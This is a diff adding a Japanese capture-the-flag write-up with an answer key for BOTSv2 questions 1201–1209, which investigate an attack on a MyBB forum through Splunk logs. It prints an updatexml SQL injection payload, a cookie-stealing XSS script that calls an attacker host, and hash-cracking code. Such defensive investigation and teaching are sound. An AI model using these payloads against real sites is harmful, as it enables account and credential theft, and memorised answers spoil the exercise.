@@ -1,0 +1,411 @@
+[[chap_botsv2_brewertalk]]
+== BOTSv2 (2): brewertalk.com への攻撃
+
+=== シナリオ
+
+Frothly が運営するビール愛好家向けフォーラム `www.brewertalk.com`（MyBB）が攻撃を受けた．
+攻撃者は脆弱性スキャンの後，SQL インジェクションでユーザー情報を盗み，
+さらに XSS とスピアフィッシングで管理者権限のユーザーを作成した．
+
+この章では問題 1201〜1209 を扱う．
+主に使うデータは `stream:http`（フォーラムへの HTTP 通信）と `stream:dns`，`access_combined`（Web サーバーのアクセスログ）である．
+
+.攻撃の全体像（この章で明らかになること）
+[cols="1,4", options="header"]
+|===
+|時刻（UTC, 2017 年 8 月） |出来事
+
+|11 日 14:40〜14:46
+|`45.77.65.211` から w3af による脆弱性スキャン
+
+|15 日 23:35
+|Kevin Lagerfield のブラウザで XSS が発動し，Cookie が攻撃者のサーバーに送られる
+
+|16 日 15:18〜15:19
+|盗まれた anti-CSRF トークンで，管理者ユーザー `kIagerfield` が作成される
+
+|16 日 15:24〜
+|`45.77.65.211` から `/member.php` への SQL インジェクションで `mybb_users` テーブルを抜き取る
+|===
+
+[[q1201]]
+=== 1201: brewertalk.com の公開 IP アドレス
+
+[quote]
+____
+What is the public IPv4 address of the server running www.brewertalk.com?
+____
+
+配点：10 点
+
+.方針
+DNS の応答で `www.brewertalk.com` に対応するアドレスを見る．
+
+[source,spl]
+----
+index=botsv2 sourcetype=stream:dns "query{}"=www.brewertalk.com
+| stats count by host_addr{}
+----
+
+応答は `52.42.208.228` だけである．
+
+WARNING: HTTP 通信の `dest_ip` を集計すると，`172.31.4.249` が圧倒的に多い．
+これは AWS の VPC 内部のプライベートアドレスで，サーバー側で取得したパケットに現れる．
+問題は「公開（public）」アドレスを問うているので，`52.42.208.228` を答える．
+
+[source,spl]
+----
+index=botsv2 sourcetype=stream:http site=www.brewertalk.com
+| stats count by dest_ip
+----
+
+.答え
+[%collapsible.answer]
+====
+`52.42.208.228`
+====
+
+[[q1202]]
+=== 1202: 脆弱性スキャンを行った IP アドレス
+
+[quote]
+____
+Provide the IP address of the system used to run a web vulnerability scan against www.brewertalk.com.
+____
+
+配点：15 点
+
+.方針
+User-Agent を一覧にし，脆弱性スキャナの名前を探す．
+
+[source,spl]
+----
+index=botsv2 sourcetype=stream:http site=www.brewertalk.com
+| stats count by http_user_agent
+| sort count
+----
+
+件数の少ない User-Agent を眺めると，`w3af.org` を含むもの（オープンソースの Web 脆弱性スキャナ w3af）がある．
+その送信元を調べる．
+
+[source,spl]
+----
+index=botsv2 sourcetype=stream:http site=www.brewertalk.com http_user_agent=*w3af*
+| stats count by src_ip http_user_agent
+----
+
+`45.77.65.211` から 8,811 件である．
+
+TIP: Web サーバーのアクセスログでも同じことが分かる．
+`index=botsv2 sourcetype=access_combined useragent=*w3af* | stats count by clientip`
+
+.答え
+[%collapsible.answer]
+====
+`45.77.65.211`
+====
+
+[[q1203]]
+=== 1203: 別のツールで攻撃された URI パス
+
+[quote]
+____
+The IP address from the previous question is also being used by a likely different piece of software to attack a URI path. What is the URI path? Include the leading forward slash. Do not include the query string.
+____
+
+配点：10 点
+
+.方針
+同じ送信元から，w3af 以外の User-Agent で送られたリクエストを URI パスごとに集計する．
+
+[source,spl]
+----
+index=botsv2 sourcetype=stream:http src_ip=45.77.65.211 site=www.brewertalk.com http_user_agent!=*w3af*
+| stats count by http_user_agent uri_path
+| sort -count
+----
+
+`Chrome/30.0.1599.17` という古い Chrome を名乗る User-Agent で，`/member.php` に 136 件のリクエストが集中している．
+w3af のスキャンとは別のツール（SQL インジェクションの自動化ツール）と考えられる．
+
+NOTE: Shellshock の検査文字列（`() { :;}; ...`）を User-Agent にしたリクエストもあるが，これらは w3af のスキャンの一部で，件数も 1 件ずつである．
+
+.答え
+[%collapsible.answer]
+====
+`/member.php`
+====
+
+[[q1204]]
+=== 1204: 悪用された SQL 関数
+
+[quote]
+____
+What SQL function is being abused on that URI path?
+____
+
+配点：10 点
+
+.方針
+1203 のリクエストのフォームデータ（`form_data`）を読む．
+
+[source,spl]
+----
+index=botsv2 sourcetype=stream:http src_ip=45.77.65.211 uri_path=/member.php http_user_agent="*Chrome/30*"
+| table _time form_data
+----
+
+ユーザー登録フォームの `question_id` パラメーターに，次のような SQL が注入されている．
+
+----
+question_id=makman' and updatexml(NULL,concat (0x3a,(SELECT salt FROM mybb_users ORDER BY UID LIMIT 0,1)),NULL) and '1
+----
+
+MySQL の `updatexml()` は，第 2 引数が XPath として不正だとエラーメッセージにその文字列を含めて返す．
+攻撃者は `concat(0x3a, (SELECT ...))` で先頭に `:` を付けた値をわざと不正な XPath にし，
+エラーメッセージからデータを読み出している（エラーベース SQL インジェクション）．
+
+.答え
+[%collapsible.answer]
+====
+`updatexml`
+====
+
+[[q1205]]
+=== 1205: Frank Ester のパスワードの salt
+
+[quote]
+____
+What is Frank Ester's password salt value on www.brewertalk.com?
+____
+
+配点：20 点
+
+.方針
+1204 の攻撃で返ってきたエラーメッセージ（`XPATH syntax error: ':...'`）を，
+送った SQL と組み合わせて時系列に並べる．
+
+[source,spl]
+----
+index=botsv2 sourcetype=stream:http src_ip=45.77.65.211 uri_path=/member.php "XPATH syntax error"
+| rex field=form_data "concat \(0x3a,\((?<query>.+?)\)\),NULL\)"
+| rex field=dest_content "XPATH syntax error: ':(?<leak>[^']*)'"
+| sort 0 _time
+| table _time query leak
+----
+
+結果の冒頭は次のようになる．
+
+[cols="1,4,2", options="header"]
+|===
+|_time |query |leak
+|15:24:49 |`select table_name from information_schema.columns ...` |`mybb_users`
+|15:24:50 |`SELECT COUNT(*) FROM mybb_users` |`6`
+|15:24:51 |`SELECT username FROM mybb_users ORDER BY UID LIMIT 0,1` |`frank`
+|15:24:52 |`SELECT email FROM mybb_users ORDER BY UID LIMIT 0,1` |`frankesters47@gmail.com`
+|15:24:53 |`SELECT salt FROM mybb_users ORDER BY UID LIMIT 0,1` |`gGsxysZL`
+|15:24:54 |`SUBSTRING((SELECT password ... LIMIT 0,1), 1, 31)` |`6a287cfc500c0b748bf0e4c4c44f7d6`
+|15:24:54 |`SUBSTRING((SELECT password ... LIMIT 0,1), 32, 31)` |`f`
+|===
+
+攻撃者は `mybb_users` テーブルを 1 行ずつ（`LIMIT n,1`），列ごとに `LENGTH()` で長さを調べてから値を抜き出している．
+1 行目（`LIMIT 0,1`）のユーザー名が `frank`，メールアドレスが `frankesters47@gmail.com` なので，これが Frank Ester である．
+その salt は `gGsxysZL` である．
+
+NOTE: `updatexml()` のエラーメッセージは 32 文字までしか返さないため，32 文字のパスワードハッシュは
+`SUBSTRING(..., 1, 31)` と `SUBSTRING(..., 32, 31)` の 2 回に分けて抜き出されている．
+
+.答え
+[%collapsible.answer]
+====
+`gGsxysZL`
+====
+
+[[q1206]]
+=== 1206: ユーザー btun のパスワード
+
+[quote]
+____
+What is user btun's password on brewertalk.com?
+____
+
+配点：20 点
+
+.方針
+1205 の SPL の結果から btun の行（`LIMIT 2,1`）を探し，salt とパスワードハッシュを取り出す．
+MyBB のパスワードハッシュの方式に従って，よく使われるパスワードを総当たりする．
+
+1205 の結果のうち `LIMIT 2,1` の行は次のとおりである．
+
+[cols="2,3", options="header"]
+|===
+|列 |漏えいした値
+|username |`btun`
+|email |`btun@froth.ly`
+|salt |`tlX7cQPE`
+|password（1〜31 文字目） |`f91904c1dd2723d5911eeba409cc0d1`
+|password（32 文字目） |`4`
+|===
+
+パスワードハッシュは 2 つを連結した `f91904c1dd2723d5911eeba409cc0d14` である．
+
+MyBB はパスワードを次の式でハッシュ化して保存している．
+
+----
+md5( md5(salt) + md5(password) )
+----
+
+よく使われるパスワードの一覧（例えば SecLists の `10-million-password-list-top-1000.txt`）を使い，
+ローカルで総当たりする．
+
+[source,python]
+----
+import hashlib
+
+def md5(s):
+    return hashlib.md5(s.encode()).hexdigest()
+
+salt = "tlX7cQPE"
+target = "f91904c1dd2723d5911eeba409cc0d14"
+
+with open("10-million-password-list-top-1000.txt") as f:
+    for line in f:
+        pw = line.strip()
+        if md5(md5(salt) + md5(pw)) == target:
+            print("found:", pw)
+            break
+----
+
+一覧の最初の方にあるパスワードで一致する．
+
+WARNING: `md5(md5(password) + salt)` など式を取り違えると，どれだけ大きな辞書を使っても一致しない．
+ある writeup は式を誤ったまま 3 億通り以上を試して解けなかった．
+MyBB の方式は「salt と password をそれぞれ md5 してから連結し，もう一度 md5」である．
+
+IMPORTANT: ハッシュの総当たりは，演習データのように許可された対象に限って行うこと．
+
+.答え
+[%collapsible.answer]
+====
+`123456`
+====
+
+[[q1207]]
+=== 1207: XSS で送られた Cookie の値
+
+[quote]
+____
+What was the value of the cookie that Kevin's browser transmitted to the malicious URL as part of an XSS attack? All digits, not the cookie name.
+____
+
+配点：10 点
+
+.方針
+XSS で Cookie を盗むスクリプトは，`document.cookie` を攻撃者のサーバーの URL に付けて送らせる．
+フォーラムへのリクエストのクエリ文字列から `<script>` を含むものを探す．
+
+[source,spl]
+----
+index=botsv2 sourcetype=stream:http site=www.brewertalk.com uri_path=/member.php uri_query="*script*"
+| stats count by src_ip uri_query
+----
+
+アカウント有効化ページ（`member.php?action=activate&code=...`）の `code` パラメーターに，
+URL エンコードされたスクリプトが埋め込まれている．デコードすると次のとおりである．
+
+----
+"><script>document.location="http://45.77.65.211:9999/microsoftuserfeedbackservice?metric=" + document.cookie;</script>
+----
+
+TIP: `| eval q=urldecode(uri_query)` を付けるとデコードした状態で読める．
+単に `"document.cookie"` で検索すると，EC サイトの JavaScript ファイル（`jquery.cookie.js` など）が大量にヒットして見つけにくい．
+
+TIP: Kevin の端末から通常と異なるポートへの通信を探す方法もある．
+`index=botsv2 sourcetype=stream:http src_ip=10.0.2.109 NOT dest_port IN (80,443) | stats count by dest_ip dest_port uri_path`
+
+送り先の `/microsoftuserfeedbackservice` へのリクエストを見る．
+
+[source,spl]
+----
+index=botsv2 sourcetype=stream:http uri_path=/microsoftuserfeedbackservice
+| table _time src_ip dest_ip dest_port uri_query
+----
+
+2017-08-15 23:35:52 に Kevin の端末 `10.0.2.109` から `45.77.65.211:9999` へ送られており，クエリは次のとおりである．
+
+----
+metric=mybb[lastvisit]=1502408189;%20mybb[lastactive]=1502408189
+----
+
+.答え
+[%collapsible.answer]
+====
+`1502408189`
+====
+
+[[q1208]]
+=== 1208: 盗まれた anti-CSRF トークン
+
+[quote]
+____
+What was the value of the anti-CSRF token (my_post_key) that was stolen from Kevin Lagerfield's computer and used to create an unauthorized admin user?
+____
+
+配点：20 点
+
+.方針
+MyBB の管理画面でユーザーを作るリクエストには，CSRF 対策のトークン `my_post_key` と，
+所属グループ `usergroup` が含まれる．管理者グループは `usergroup=4` である．
+
+[source,spl]
+----
+index=botsv2 sourcetype=stream:http form_data=*my_post_key* form_data="*usergroup=4*"
+| rex field=form_data "my_post_key=(?<key>[^&]+)"
+| rex field=form_data "username=(?<user>[^&]+)"
+| table _time src_ip uri_path user key
+----
+
+[cols="2,1,1,2", options="header"]
+|===
+|_time |src_ip |user |key
+|2017-08-16 15:18:39 |`10.0.2.109`（Kevin） |`kIagerfield` |`1bc3eab741900ab25c98eee86bf20feb`
+|2017-08-16 15:19:18 |`71.39.18.125`（攻撃者） |`kIagerfield` |`1bc3eab741900ab25c98eee86bf20feb`
+|===
+
+Kevin のブラウザ上で動いたスクリプトがトークンを読み取ってユーザー作成を試み，
+続いて攻撃者自身も同じトークンで同じリクエストを送っている．
+
+WARNING: `my_post_key` を含むリクエストは正規の管理操作にもたくさんある．
+「不正な管理者ユーザーの作成」に絞らずに最初に見つかったトークンを答えないこと．
+
+.答え
+[%collapsible.answer]
+====
+`1bc3eab741900ab25c98eee86bf20feb`
+====
+
+[[q1209]]
+=== 1209: 不正に作成されたユーザー名
+
+[quote]
+____
+What brewertalk.com username was maliciously created by a spearphishing attack?
+____
+
+配点：15 点
+
+.方針
+1208 のリクエストの `username` を読む．
+
+作成されたユーザー名は `kIagerfield` である．
+Kevin のユーザー名 `klagerfield`（小文字の L）に見せかけて，2 文字目を **大文字の I** にしたホモグラフ（見た目の似た文字による偽装）である．
+
+WARNING: 画面のフォントによっては l と I の区別がつかない．
+コピー＆ペーストするか，`| eval c=substr(user, 2, 1)` のように 1 文字ずつ確かめること．
+なお演習環境の判定は大文字・小文字を区別しないため，`klagerfield` と入力しても正解にはならない（l と i は別の文字）．
+
+.答え
+[%collapsible.answer]
+====
+`kIagerfield`（2 文字目は大文字のアイ）
+====
